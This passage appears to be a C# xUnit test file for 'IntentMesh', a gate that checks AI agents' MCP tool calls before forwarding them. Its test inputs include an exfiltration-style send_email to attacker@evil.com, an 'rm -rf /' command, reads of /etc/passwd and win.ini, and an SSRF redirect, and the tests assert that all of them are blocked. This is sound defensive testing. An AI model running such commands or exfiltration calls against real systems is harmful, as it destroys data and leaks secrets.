using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using IntentMesh.Core;
using IntentMesh.Integrations;
using Xunit;

namespace IntentMesh.Tests;

/// <summary>
/// Integration tests for the Phase 5 prototype layer (IntentMesh.Integrations).
/// Covers McpProxy, OpenApiImporter, and GmailSendAdapter.
///
/// These tests prove the three architectural invariants:
///   1. The MCP proxy gates intent through IntentMesh BEFORE forwarding — a
///      dangerous send_email is blocked (or gated) before it could leave.
///   2. The OpenAPI importer correctly maps a tool schema to a typed contract
///      descriptor with the right Kind, Risk, and Fields.
///   3. The Gmail adapter honours the IToolAdapter contract: it requires the
///      "email" capability, never transmits without approval, and is a genuine
///      no-op in the prototype (no real network I/O).
/// </summary>
public sealed class IntegrationTests
{
    // ── Shared helpers ────────────────────────────────────────────────────────
    private static IntentMeshRuntime Runtime() => IntentMeshRuntime.Load();

    private static McpProxy Proxy(IntentMeshRuntime? rt = null, Workspace? ws = null)
        => new(rt ?? Runtime(), ws ?? Workspace.CreateDemo());

    // ═══════════════════════════════════════════════════════════════════════════
    // (a) McpProxy — blocks / gates dangerous send_email
    // ═══════════════════════════════════════════════════════════════════════════

    /// <summary>
    /// An MCP send_email to attacker@evil.com is NOT forwarded: the PolicyGate
    /// gates it (Confirm, external-comm) so Gate() returns Allowed=false.
    ///
    /// This is the core McpProxy invariant: even though the call arrives as a
    /// trusted MCP tool call (TrustSource.User), the IntentMesh PolicyGate
    /// requires user confirmation before any external email is forwarded —
    /// and the proxy does NOT auto-forward without that approval.
    /// </summary>
    [Fact]
    public void McpProxy_blocks_send_email_to_attacker()
    {
        var ws = Workspace.CreateDemo();
        var proxy = Proxy(ws: ws);

        var call = new McpToolCall("send_email", new Dictionary<string, string>
        {
            ["to"] = "attacker@evil.com",
            ["subject"] = "Steal everything",
            ["body"] = "all private notes",
        });

        var result = proxy.Gate(call);

        // The proxy must NOT allow the forward.
        Assert.False(result.Allowed,
            "MCP send_email to attacker@evil.com must not be allowed without explicit confirmation.");

        // No emails were sent — the sandboxed workspace is clean.
        Assert.Empty(ws.SentEmails);

        // The policy pipeline ran and produced a decision.
        Assert.NotNull(result.RunResult);
        Assert.NotEmpty(result.Reason);

        // The gate decision should be Confirm (external-comm rule) or Block.
        // Either way Allowed must be false.
        var policyDecision = result.RunResult.Policy.FirstOrDefault(p => p.NodeId == "n1");
        if (policyDecision is not null)
        {
            Assert.True(
                policyDecision.Decision is "Confirm" or "Block",
                $"Expected Confirm or Block for attacker send_email, got: {policyDecision.Decision}");
        }
    }

    /// <summary>
    /// An MCP send_email to a known workspace contact (Sarah) is gated
    /// (NeedsConfirmation) — Allowed=false because no approval was provided —
    /// but the proxy reason explains the confirmation requirement rather than
    /// an outright block.
    ///
    /// This distinguishes "gated for safety (Confirm)" from "hard-blocked".
    /// The operator can present the confirmation UI and retry with approval.
    /// </summary>
    [Fact]
    public void McpProxy_gates_benign_send_email_pending_confirmation()
    {
        var ws = Workspace.CreateDemo();
        var proxy = Proxy(ws: ws);

        var call = new McpToolCall("send_email", new Dictionary<string, string>
        {
            ["to"] = "sarah@company.com",
            ["subject"] = "Meeting summary",
        });

        var result = proxy.Gate(call);

        // Allowed is false because no approval was provided (NeedsConfirmation).
        // This is the correct gating behaviour: the proxy does NOT auto-forward.
        Assert.False(result.Allowed,
            "send_email requires confirmation — proxy must not auto-forward without approval.");

        // No emails were sent.
        Assert.Empty(ws.SentEmails);

        // The reason mentions confirmation or gating, not a hard security block.
        Assert.Contains("Confirm", result.Reason, StringComparison.OrdinalIgnoreCase);

        // The run result contains a policy decision for the node.
        Assert.NotEmpty(result.RunResult.Policy);
    }

    /// <summary>
    /// An unmapped MCP tool is blocked with a clear "not mapped" reason — the
    /// proxy is fail-closed for unknown tools.
    /// </summary>
    [Fact]
    public void McpProxy_blocks_unmapped_tool()
    {
        var proxy = Proxy();
        var call = new McpToolCall("unknown_tool", new Dictionary<string, string>());

        var result = proxy.Gate(call);

        Assert.False(result.Allowed);
        Assert.Contains("not mapped", result.Reason, StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// An MCP run_command that is NOT on the allow-list (e.g., "rm -rf /")
    /// is blocked by the PolicyGate (pol-command-not-allowlisted).
    /// </summary>
    [Fact]
    public void McpProxy_blocks_run_command_not_on_allowlist()
    {
        var ws = Workspace.CreateDemo();
        var proxy = Proxy(ws: ws);

        var call = new McpToolCall("run_command", new Dictionary<string, string>
        {
            ["cmd"] = "rm -rf /",
        });

        var result = proxy.Gate(call);

        Assert.False(result.Allowed);

        // The pipeline should have blocked this command.
        var policyDecision = result.RunResult.Policy.FirstOrDefault(p => p.NodeId == "n1");
        if (policyDecision is not null)
            Assert.Equal("Block", policyDecision.Decision);
    }

    private static bool NodeAvailable()
    {
        try
        {
            using var p = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
            { FileName = "node", Arguments = "--version", RedirectStandardOutput = true, UseShellExecute = false });
            return p is not null && p.WaitForExit(5000) && p.ExitCode == 0;
        }
        catch { return false; }
    }

    /// <summary>
    /// REAL MCP transport: connect to a real MCP server (mcp-echo-server.js over stdio JSON-RPC),
    /// list its tools, and forward an APPROVED call (read_calendar — low risk). The proxy gates the
    /// intent, then the real server responds.
    /// </summary>
    [SkippableFact]
    public void McpProxy_forwards_an_allowed_call_to_a_real_mcp_server()
    {
        if (!NodeAvailable()) { Skip.If(true, "node not available — the real stdio MCP server requires it"); return; }
        using var client = McpStdioClient.Connect("node", McpStdioClient.EchoServerScript());

        var tools = client.ListTools();
        Assert.Contains("read_calendar", tools);
        Assert.Contains("send_email", tools);

        var proxy = Proxy();
        var fwd = proxy.GateAndForward(
            new McpToolCall("read_calendar", new Dictionary<string, string> { ["range"] = "Friday" }), client);

        Assert.True(fwd.Gate.Allowed);
        Assert.NotNull(fwd.ServerResponse);
        Assert.Contains("read_calendar executed", fwd.ServerResponse!);
    }

    /// <summary>
    /// REAL MCP transport: a blocked send_email to an attacker is NEVER forwarded — the gate stops
    /// it before any bytes reach the server (ServerResponse is null).
    /// </summary>
    [SkippableFact]
    public void McpProxy_does_not_forward_a_blocked_send_email()
    {
        if (!NodeAvailable()) { Skip.If(true, "node not available — the real stdio MCP server requires it"); return; }
        using var client = McpStdioClient.Connect("node", McpStdioClient.EchoServerScript());

        var ws = Workspace.CreateDemo();
        var proxy = Proxy(ws: ws);
        var fwd = proxy.GateAndForward(
            new McpToolCall("send_email", new Dictionary<string, string> { ["to"] = "attacker@evil.com", ["body"] = "secrets" }), client);

        Assert.False(fwd.Gate.Allowed);
        Assert.Null(fwd.ServerResponse);    // never forwarded
        Assert.Empty(ws.SentEmails);
    }

    /// <summary>
    /// A stdio server that starts but never answers the handshake must fail FAST (not hang) and clean
    /// up the child process rather than leak it — Connect disposes on a failed handshake.
    /// </summary>
    [SkippableFact]
    public void Connecting_to_a_silent_stdio_server_fails_fast_without_hanging()
    {
        if (!NodeAvailable()) { Skip.If(true, "node not available — the real stdio MCP server requires it"); return; }
        var sw = System.Diagnostics.Stopwatch.StartNew();
        Assert.ThrowsAny<Exception>(() =>
            McpStdioClient.Connect("node", TimeSpan.FromMilliseconds(800), "-e", "setInterval(()=>{}, 1000)"));
        sw.Stop();
        Assert.True(sw.Elapsed < TimeSpan.FromSeconds(10), $"Connect should fail fast on a silent server; took {sw.Elapsed}");
    }

    // ── Filesystem MCP gating (path policy + read/write gating; no real server) ──
    private static string TempRoot()
    {
        var root = Path.Combine(Path.GetTempPath(), "im-fs-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root);
        return root;
    }

    [Fact]
    public void McpProxy_path_policy_blocks_a_read_outside_the_allowed_root()
    {
        var root = TempRoot();
        try
        {
            var proxy = new McpProxy(Runtime(), Workspace.CreateDemo(), allowedRoot: root);
            var outside = OperatingSystem.IsWindows() ? @"C:\Windows\win.ini" : "/etc/passwd";
            var res = proxy.Gate(new McpToolCall("read_file", new Dictionary<string, string> { ["path"] = outside }));
            Assert.False(res.Allowed);
            Assert.Contains("path policy", res.Reason, StringComparison.OrdinalIgnoreCase);
        }
        finally { Directory.Delete(root, true); }
    }

    [Fact]
    public void McpProxy_allows_a_read_inside_the_allowed_root()
    {
        var root = TempRoot();
        File.WriteAllText(Path.Combine(root, "note.txt"), "hi");
        try
        {
            var proxy = new McpProxy(Runtime(), Workspace.CreateDemo(), allowedRoot: root);
            var res = proxy.Gate(new McpToolCall("read_file", new Dictionary<string, string> { ["path"] = Path.Combine(root, "note.txt") }));
            Assert.True(res.Allowed);
        }
        finally { Directory.Delete(root, true); }
    }

    [Fact]
    public void McpProxy_fs_write_is_gated_then_allowed_with_approval()
    {
        var root = TempRoot();
        try
        {
            var proxy = new McpProxy(Runtime(), Workspace.CreateDemo(), allowedRoot: root);
            var call = new McpToolCall("write_file", new Dictionary<string, string> { ["path"] = Path.Combine(root, "out.txt"), ["content"] = "x" });
            Assert.False(proxy.Gate(call).Allowed);                                  // no approval → gated
            Assert.True(proxy.Gate(call, new HashSet<string> { "n1" }).Allowed);     // approved → allowed
        }
        finally { Directory.Delete(root, true); }
    }

    /// <summary>
    /// END-TO-END against the REAL @modelcontextprotocol/server-filesystem over stdio. Gated behind
    /// INTENTMESH_FS_E2E=1 because it downloads the npm package (kept off the default CI run); the
    /// path-policy + gating logic above is fully covered without it.
    /// </summary>
    [SkippableFact]
    public void McpProxy_wires_a_real_filesystem_mcp_server_end_to_end()
    {
        if (Environment.GetEnvironmentVariable("INTENTMESH_FS_E2E") != "1") { Skip.If(true, "set INTENTMESH_FS_E2E=1 to run the real @modelcontextprotocol/server-filesystem E2E"); return; }
        if (!NodeAvailable()) { Skip.If(true, "node not available — the real stdio MCP server requires it"); return; }

        var root = TempRoot();
        File.WriteAllText(Path.Combine(root, "note.txt"), "hello from the sandbox");
        McpStdioClient? client = null;
        try
        {
            try { client = McpStdioClient.ConnectNpx("@modelcontextprotocol/server-filesystem", root); }
            catch { Skip.If(true, "could not launch @modelcontextprotocol/server-filesystem via npx"); return; }
            var tools = client.ListTools();
            if (tools.Count == 0) { Skip.If(true, "filesystem MCP server exposed no tools"); return; }
            Assert.Contains("read_file", tools);
            Assert.Contains("write_file", tools);

            var proxy = new McpProxy(Runtime(), Workspace.CreateDemo(), allowedRoot: root);

            // Allowed read → forwarded → real file content.
            var read = proxy.GateAndForward(new McpToolCall("read_file", new Dictionary<string, string> { ["path"] = Path.Combine(root, "note.txt") }), client);
            Assert.True(read.Gate.Allowed);
            Assert.Contains("hello from the sandbox", read.ServerResponse!);

            // Path escape → blocked → never forwarded.
            var outside = OperatingSystem.IsWindows() ? @"C:\Windows\win.ini" : "/etc/passwd";
            var esc = proxy.GateAndForward(new McpToolCall("read_file", new Dictionary<string, string> { ["path"] = outside }), client);
            Assert.False(esc.Gate.Allowed);
            Assert.Null(esc.ServerResponse);

            // Write gated; with approval → forwarded → the real server writes the file.
            var writeCall = new McpToolCall("write_file", new Dictionary<string, string> { ["path"] = Path.Combine(root, "out.txt"), ["content"] = "written via IntentMesh" });
            Assert.False(proxy.GateAndForward(writeCall, client).Gate.Allowed);
            var approved = proxy.GateAndForward(writeCall, client, new HashSet<string> { "n1" });
            Assert.True(approved.Gate.Allowed);
            Assert.True(File.Exists(Path.Combine(root, "out.txt")));
        }
        finally { client?.Dispose(); try { Directory.Delete(root, true); } catch { } }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // (b) OpenApiImporter — ToContract produces the expected ImportedContract
    // ═══════════════════════════════════════════════════════════════════════════

    /// <summary>
    /// The sample invoice schema (POST financial-write) maps to the expected
    /// ImportedContract: Kind=act-create-invoice, Risk=medium,
    /// SideEffect=financial-write, Fields contains the operation parameters,
    /// RequiresConfirmation=true.
    /// </summary>
    [Fact]
    public void OpenApiImporter_ToContract_invoice_schema_produces_expected_contract()
    {
        var contract = OpenApiImporter.ToContract(OpenApiImporter.SampleInvoiceSchema);

        Assert.Equal("act-create-invoice", contract.Kind);
        Assert.Equal("medium", contract.Risk);
        Assert.Equal("financial-write", contract.SideEffect);
        Assert.Contains("customer_id", contract.Fields);
        Assert.Contains("amount_cents", contract.Fields);
        Assert.Contains("due_date", contract.Fields);
        Assert.True(contract.RequiresConfirmation,
            "POST + financial-write side effect must require confirmation.");
    }

    /// <summary>
    /// A read-only GET with no side-effect maps to: Risk=low, SideEffect=none,
    /// RequiresConfirmation=false.
    /// </summary>
    [Fact]
    public void OpenApiImporter_ToContract_get_schema_does_not_require_confirmation()
    {
        var contract = OpenApiImporter.ToContract(OpenApiImporter.SampleGetCustomerSchema);

        Assert.Equal("act-get-customer", contract.Kind);
        Assert.Equal("low", contract.Risk);
        Assert.Equal("none", contract.SideEffect);
        Assert.Contains("customer_id", contract.Fields);
        Assert.False(contract.RequiresConfirmation,
            "GET with no side effect must not require confirmation.");
    }

    /// <summary>
    /// A DELETE without a risk hint infers Risk=high from the method.
    /// </summary>
    [Fact]
    public void OpenApiImporter_ToContract_delete_infers_high_risk()
    {
        var schema = new ToolSchema(
            Name: "delete_invoice",
            Method: "DELETE",
            Summary: "Hard-delete an invoice record.",
            Parameters: new[] { "invoice_id" },
            SideEffectHint: "financial-write");

        var contract = OpenApiImporter.ToContract(schema);

        Assert.Equal("act-delete-invoice", contract.Kind);
        Assert.Equal("high", contract.Risk);
        Assert.True(contract.RequiresConfirmation);
    }

    /// <summary>
    /// Caller-supplied RiskHint overrides the inferred risk from the method.
    /// </summary>
    [Fact]
    public void OpenApiImporter_ToContract_caller_risk_hint_overrides_inferred_risk()
    {
        var schema = new ToolSchema(
            Name: "safe_post",
            Method: "POST",
            Summary: "An idempotent POST that is intentionally low-risk.",
            Parameters: new[] { "id" },
            RiskHint: "low",
            SideEffectHint: "none");

        // A RiskHint is still honored (risk = low). But an UNTRUSTED spec (default) may not downgrade a
        // mutating op to side-effect "none" — confirmation is required despite the hint.
        var untrusted = OpenApiImporter.ToContract(schema);
        Assert.Equal("low", untrusted.Risk);
        Assert.True(untrusted.RequiresConfirmation, "untrusted POST cannot drop confirmation via a 'none' hint");

        // A trusted caller keeps full control of the hint.
        var trusted = OpenApiImporter.ToContract(schema, trusted: true);
        Assert.False(trusted.RequiresConfirmation);
    }

    /// <summary>
    /// ParseFromOpenApi parses a real OpenAPI 3.x JSON document: a POST /invoices operation
    /// (operationId create_invoice) with request-body properties becomes a ToolSchema whose fields
    /// include those properties, and a GET becomes a separate read-only schema.
    /// </summary>
    [Fact]
    public void OpenApiImporter_parses_a_real_openapi_spec()
    {
        const string spec = """
        {
          "openapi": "3.0.0",
          "info": { "title": "Billing", "version": "1.0" },
          "paths": {
            "/invoices": {
              "post": {
                "operationId": "create_invoice",
                "summary": "Create an invoice",
                "requestBody": { "content": { "application/json": { "schema": {
                  "type": "object",
                  "properties": { "customer_id": {"type":"string"}, "amount_cents": {"type":"integer"} } } } } }
              }
            },
            "/invoices/{id}": {
              "get": {
                "operationId": "get_invoice",
                "summary": "Read an invoice",
                "parameters": [ { "name": "id", "in": "path" } ]
              }
            }
          }
        }
        """;

        var schemas = OpenApiImporter.ParseFromOpenApi(spec);
        Assert.Equal(2, schemas.Count);

        var post = Assert.Single(schemas, s => s.Name == "create_invoice");
        Assert.Equal("POST", post.Method);
        Assert.Contains("customer_id", post.Parameters);
        Assert.Contains("amount_cents", post.Parameters);

        var get = Assert.Single(schemas, s => s.Name == "get_invoice");
        Assert.Equal("GET", get.Method);
        Assert.Contains("id", get.Parameters);
    }

    /// <summary>
    /// RegisterToCompiledDir compiles an imported contract into a real im-imported.tlmz that
    /// SymbolicBundle.Load picks up — the new kind becomes registered (enforced end-to-end).
    /// Uses an isolated temp dir so the canonical dataset is untouched.
    /// </summary>
    [Fact]
    public void OpenApiImporter_registers_imported_contracts_into_a_loadable_bundle()
    {
        var src = DatasetLocator.FindCompiledDir();
        var tmp = Path.Combine(Path.GetTempPath(), "im-import-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(tmp);
        try
        {
            foreach (var f in Directory.GetFiles(src, "im-*.tlmz"))
                File.Copy(f, Path.Combine(tmp, Path.GetFileName(f)));

            var before = SymbolicBundle.Load(tmp);
            Assert.False(before.IsRegistered("act-create-invoice"));

            var contract = OpenApiImporter.ToContract(OpenApiImporter.SampleInvoiceSchema);
            OpenApiImporter.RegisterToCompiledDir(tmp, contract);

            var after = SymbolicBundle.Load(tmp);
            Assert.True(after.IsRegistered("act-create-invoice"));   // import is now a usable typed contract
            Assert.Equal(before.Contracts.Count + 1, after.Contracts.Count);
            Assert.Equal("medium", after.Contracts["act-create-invoice"].Risk);
        }
        finally { Directory.Delete(tmp, recursive: true); }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // (c) GmailSendAdapter — requires "email" capability, no-op stub
    // ═══════════════════════════════════════════════════════════════════════════

    /// <summary>
    /// GmailSendAdapter.Handles() returns true for act-send-email and false for
    /// any other kind — it correctly declares its coverage.
    /// </summary>
    [Fact]
    public void GmailSendAdapter_handles_only_send_email()
    {
        var adapter = OAuthAdapterWiringExample.CreateAdapter();

        Assert.True(adapter.Handles(Kinds.SendEmail));
        Assert.False(adapter.Handles(Kinds.DraftEmail));
        Assert.False(adapter.Handles(Kinds.RunCommand));
        Assert.False(adapter.Handles(Kinds.ReadCalendar));
    }

    /// <summary>
    /// The adapter's required capability constant matches the bundle's capability
    /// map — so the PolicyGate's capability scoping gate will correctly block the
    /// adapter when "email" is not granted.
    /// </summary>
    [Fact]
    public void GmailSendAdapter_required_capability_matches_bundle()
    {
        var bundle = SymbolicBundle.Load(DatasetLocator.FindCompiledDir());
        Assert.Equal(GmailSendAdapter.RequiredCapability, bundle.Capabilities[Kinds.SendEmail]);
    }

    /// <summary>
    /// Without approval, Execute() halts and transmits nothing (0 messages sent).
    /// This is the core no-op stub assertion: no real network I/O, no email.
    /// </summary>
    [Fact]
    public void GmailSendAdapter_does_not_transmit_without_approval()
    {
        var adapter = OAuthAdapterWiringExample.CreateAdapter();
        var ws = Workspace.CreateDemo();

        var node = new IntentNode
        {
            Id = "n1",
            Type = Kinds.SendEmail,
            Label = "Send email (test)",
            Action = new SendEmailAction("mcp-draft", "sarah@company.com", Array.Empty<string>()),
            TrustSource = TrustSource.User,
            Status = NodeStatus.Resolved,
        };

        var decision = new PolicyDecision(
            "n1", Decision.Confirm, "medium",
            "External communication: requires confirmation.",
            new[] { "pol-send-email" },
            RequiresConfirmation: true,
            TrustSource: "User",
            Sensitive: false, ExternalSideEffect: true, Destructive: false);

        // approved = false → adapter must halt and transmit nothing.
        var exec = adapter.Execute(node, decision, ws, approved: false);

        Assert.True(exec.Halted, "Adapter must halt when not approved.");
        Assert.Empty(ws.SentEmails);
        Assert.Contains("0 messages transmitted", exec.Summary + string.Join(" ", exec.Effects),
            StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// With approval, Execute() calls the real IEmailTransport. With a NullEmailTransport (the safe
    /// default) it records the send without network I/O — but the transport is genuinely invoked,
    /// so a configured SmtpEmailTransport would transmit for real.
    /// </summary>
    [Fact]
    public void GmailSendAdapter_sends_via_the_transport_when_approved()
    {
        var transport = new NullEmailTransport();
        var adapter = OAuthAdapterWiringExample.CreateAdapter(transport);
        var ws = Workspace.CreateDemo();
        // Draft-before-send: the send continues an existing draft (addressed by email here).
        ws.Drafts.Add(new EmailDraft("Meeting summary", "sarah@company.com", "sarah@company.com", "Meeting summary", "summary body", Array.Empty<string>(), Sent: false));

        var node = new IntentNode
        {
            Id = "n1",
            Type = Kinds.SendEmail,
            Label = "Send email (test)",
            Action = new SendEmailAction("Meeting summary", "sarah@company.com", Array.Empty<string>()),
            TrustSource = TrustSource.User,
            Status = NodeStatus.Resolved,
        };

        var decision = new PolicyDecision(
            "n1", Decision.Confirm, "medium",
            "External communication: requires confirmation.",
            new[] { "pol-send-email" },
            RequiresConfirmation: true,
            TrustSource: "User",
            Sensitive: false, ExternalSideEffect: true, Destructive: false);

        var exec = adapter.Execute(node, decision, ws, approved: true);

        Assert.False(exec.Halted, "Adapter should not halt when approved.");
        Assert.True(exec.Ran);
        Assert.Contains("sarah@company.com", ws.SentEmails);
        // The transport was actually invoked — a real SMTP transport would have transmitted here.
        Assert.Contains(transport.Sent, s => s.To == "sarah@company.com");
    }

    /// <summary>
    /// The SMTP transport falls back to a no-network NullEmailTransport when SMTP_HOST is unset,
    /// and constructs a real SMTP transport when configured.
    /// </summary>
    [Fact]
    public void SmtpEmailTransport_falls_back_to_null_when_unconfigured()
    {
        var prev = Environment.GetEnvironmentVariable("SMTP_HOST");
        Environment.SetEnvironmentVariable("SMTP_HOST", null);
        try { Assert.IsType<NullEmailTransport>(SmtpEmailTransport.FromEnvironment()); }
        finally { Environment.SetEnvironmentVariable("SMTP_HOST", prev); }

        var real = new SmtpEmailTransport("smtp.example.com", 587, "from@example.com");
        Assert.Contains("smtp.example.com", real.Describe());
    }

    /// <summary>
    /// The Gmail *API* OAuth path requires configuration: without GMAIL_ACCESS_TOKEN it reports a
    /// clear config error (SMTP needs no OAuth and works today; the interactive OAuth flow needs the
    /// user's Google credentials).
    /// </summary>
    [Fact]
    public void GmailSendAdapter_AcquireTokenAsync_requires_configuration()
    {
        var prevToken = Environment.GetEnvironmentVariable("GMAIL_ACCESS_TOKEN");
        var prevId = Environment.GetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_ID");
        var prevSecret = Environment.GetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_SECRET");
        Environment.SetEnvironmentVariable("GMAIL_ACCESS_TOKEN", null);
        Environment.SetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_ID", null);
        Environment.SetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_SECRET", null);
        try
        {
            var ex = Assert.Throws<InvalidOperationException>(() =>
                GmailSendAdapter.AcquireTokenAsync().GetAwaiter().GetResult());
            Assert.Contains("OAuth", ex.Message, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            Environment.SetEnvironmentVariable("GMAIL_ACCESS_TOKEN", prevToken);
            Environment.SetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_ID", prevId);
            Environment.SetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_SECRET", prevSecret);
        }
    }

    /// <summary>
    /// When the "email" capability is NOT granted, the PolicyGate blocks a
    /// send_email node with pol-capability-not-granted — the GmailSendAdapter
    /// is never reached. This proves the capability scoping gate works end-to-end.
    /// </summary>
    [Fact]
    public void GmailSendAdapter_capability_scoping_blocks_when_email_not_granted()
    {
        var bundle = SymbolicBundle.Load(DatasetLocator.FindCompiledDir());

        // Grant every capability EXCEPT "email".
        var grantedWithoutEmail = bundle.AllCapabilities
            .Where(c => !c.Equals("email", StringComparison.OrdinalIgnoreCase))
            .ToHashSet();

        var rt = new IntentMeshRuntime(bundle, grantedCapabilities: grantedWithoutEmail);
        var ws = Workspace.CreateDemo();

        // Run a prompt that would produce a send_email node if email were granted.
        // We use the framework test prompt that includes a draft (email domain).
        const string prompt = "Plan my Friday, move anything flexible, book an hour for the gym, and draft Sarah the meeting notes.";
        var result = rt.Run(prompt, ws);

        // The draft-email node must be blocked by capability scoping.
        var draftNode = result.Nodes.FirstOrDefault(n => n.Type == Kinds.DraftEmail);
        if (draftNode is not null)
        {
            var draftPolicy = result.Policy.Single(p => p.NodeId == draftNode.Id);
            Assert.Equal("Block", draftPolicy.Decision);
            Assert.Contains("pol-capability-not-granted", draftPolicy.TriggeredRules);
        }

        // No emails were sent or drafted via the adapter.
        Assert.Empty(ws.SentEmails);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // (d) MCP Streamable HTTP / SSE transport (McpHttpClient) — real in-process server
    // ═══════════════════════════════════════════════════════════════════════════

    /// <summary>
    /// REAL HTTP transport: connect to an in-process MCP server over Streamable HTTP that answers
    /// with application/json, list its tools, and forward an APPROVED read_calendar call. Proves the
    /// gate is transport-agnostic — the same pipeline fronts HTTP exactly like stdio.
    /// </summary>
    [SkippableFact]
    public void McpHttpClient_lists_and_forwards_over_json_transport()
    {
        using var server = McpHttpTestServer.Start(useSse: false);
        if (server is null) { Skip.If(true, "HttpListener unavailable in this environment"); return; }
        using var client = McpHttpClient.Connect(server.Url);

        var tools = client.ListTools();
        Assert.Contains("read_calendar", tools);
        Assert.Contains("send_email", tools);

        var proxy = Proxy();
        var fwd = proxy.GateAndForward(
            new McpToolCall("read_calendar", new Dictionary<string, string> { ["range"] = "Friday" }), client);

        Assert.True(fwd.Gate.Allowed);
        Assert.NotNull(fwd.ServerResponse);
        Assert.Contains("read_calendar executed via http", fwd.ServerResponse!);
    }

    /// <summary>
    /// REAL HTTP transport over Server-Sent Events: the server answers tools/call with a
    /// text/event-stream body, exercising McpHttpClient's SSE parse path. The gated forward still
    /// returns the server's result.
    /// </summary>
    [SkippableFact]
    public void McpHttpClient_forwards_over_sse_transport()
    {
        using var server = McpHttpTestServer.Start(useSse: true);
        if (server is null) { Skip.If(true, "HttpListener unavailable in this environment"); return; }
        using var client = McpHttpClient.Connect(server.Url);

        Assert.Contains("read_calendar", client.ListTools());

        var proxy = Proxy();
        var fwd = proxy.GateAndForward(
            new McpToolCall("read_calendar", new Dictionary<string, string> { ["range"] = "Friday" }), client);

        Assert.True(fwd.Gate.Allowed);
        Assert.Contains("read_calendar executed via http", fwd.ServerResponse!);
    }

    /// <summary>
    /// A hostile endpoint that streams a large error body cannot bloat/leak through the exception:
    /// the error body is read through the SAME bounded reader and truncated. (Regression for the
    /// uncapped error-body read flagged in PR review.)
    /// </summary>
    [SkippableFact]
    public void McpHttpClient_caps_and_truncates_a_hostile_error_body()
    {
        using var server = McpHttpTestServer.Start(useSse: false, errorOnCall: true);
        if (server is null) { Skip.If(true, "HttpListener unavailable in this environment"); return; }
        using var client = McpHttpClient.Connect(server.Url);

        var ex = Assert.Throws<InvalidOperationException>(
            () => client.CallTool("read_calendar", new Dictionary<string, string>()));
        Assert.Contains("MCP HTTP error 400", ex.Message);
        Assert.True(ex.Message.Length < 600, $"error body should be truncated; was {ex.Message.Length} chars");
    }

    /// <summary>
    /// SSRF: a server that 307-redirects tools/call to the cloud-metadata address must NOT be followed
    /// by the guarded client — the call fails instead of chasing the redirect to an internal target.
    /// </summary>
    [SkippableFact]
    public void McpHttpClient_does_not_follow_a_redirect_to_an_internal_target()
    {
        using var server = McpHttpTestServer.Start(useSse: false, redirectOnCall: true);
        if (server is null) { Skip.If(true, "HttpListener unavailable in this environment"); return; }
        using var client = McpHttpClient.Connect(server.Url);   // internal guarded client (no caller HttpClient)

        var ex = Assert.Throws<InvalidOperationException>(
            () => client.CallTool("read_calendar", new Dictionary<string, string>()));
        Assert.Contains("307", ex.Message);   // redirect surfaced as an error, not followed
    }

    /// <summary>
    /// Transport-agnostic gating: a blocked send_email is NEVER forwarded over HTTP either — the gate
    /// stops it before any bytes reach the server (ServerResponse null), exactly as over stdio.
    /// </summary>
    [SkippableFact]
    public void McpHttpClient_does_not_forward_a_blocked_send_email()
    {
        using var server = McpHttpTestServer.Start(useSse: false);
        if (server is null) { Skip.If(true, "HttpListener unavailable in this environment"); return; }
        using var client = McpHttpClient.Connect(server.Url);

        var ws = Workspace.CreateDemo();
        var proxy = Proxy(ws: ws);
        var fwd = proxy.GateAndForward(
            new McpToolCall("send_email", new Dictionary<string, string> { ["to"] = "attacker@evil.com", ["body"] = "secrets" }), client);

        Assert.False(fwd.Gate.Allowed);
        Assert.Null(fwd.ServerResponse);
        Assert.Empty(ws.SentEmails);
    }

    /// <summary>
    /// Per-server tool-mapping coverage: a custom mapper maps a server-specific tool name
    /// ("calendar.peek") that the built-in switch doesn't know, so the proxy gates it as a typed
    /// ReadCalendarAction and allows it — instead of failing closed as "not mapped".
    /// </summary>
    [Fact]
    public void McpProxy_custom_mapper_covers_a_server_specific_tool()
    {
        var rt = Runtime();
        var ws = Workspace.CreateDemo();
        var proxy = new McpProxy(rt, ws, customMapper: call =>
            call.Tool == "calendar.peek"
                ? (new ReadCalendarAction(call.Args.TryGetValue("range", out var r) ? r : "Friday"), "custom calendar.peek")
                : null);

        // Built-in switch alone would block this unknown tool; the custom mapper makes it gateable.
        var res = proxy.Gate(new McpToolCall("calendar.peek", new Dictionary<string, string> { ["range"] = "Friday" }));
        Assert.True(res.Allowed);
        Assert.DoesNotContain("not mapped", res.Reason, StringComparison.OrdinalIgnoreCase);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // (e) OpenAPI — YAML, $ref resolution, semantic side-effect/capability inference
    // ═══════════════════════════════════════════════════════════════════════════

    private const string YamlSpec = """
        openapi: 3.0.0
        info:
          title: Billing
          version: "1.0"
        paths:
          /invoices:
            post:
              operationId: create_invoice
              summary: Create an invoice and charge the customer
              tags:
                - billing
              requestBody:
                content:
                  application/json:
                    schema:
                      $ref: '#/components/schemas/Invoice'
          /invoices/{id}:
            parameters:
              - name: id
                in: path
                required: true
            get:
              operationId: get_invoice
              summary: Read an invoice
        components:
          schemas:
            Invoice:
              type: object
              properties:
                customer_id:
                  type: string
                amount_cents:
                  type: integer
                currency:
                  type: string
        """;

    /// <summary>
    /// ParseFromOpenApi reads a YAML spec (via MiniYaml), resolves a request-body $ref to
    /// components/schemas, and picks up path-level parameters.
    /// </summary>
    [Fact]
    public void OpenApiImporter_parses_yaml_with_ref_and_path_params()
    {
        var schemas = OpenApiImporter.ParseFromOpenApi(YamlSpec);
        Assert.Equal(2, schemas.Count);

        var post = Assert.Single(schemas, s => s.Name == "create_invoice");
        Assert.Equal("POST", post.Method);
        // Fields came from the $ref-resolved Invoice schema.
        Assert.Contains("customer_id", post.Parameters);
        Assert.Contains("amount_cents", post.Parameters);
        Assert.Contains("currency", post.Parameters);

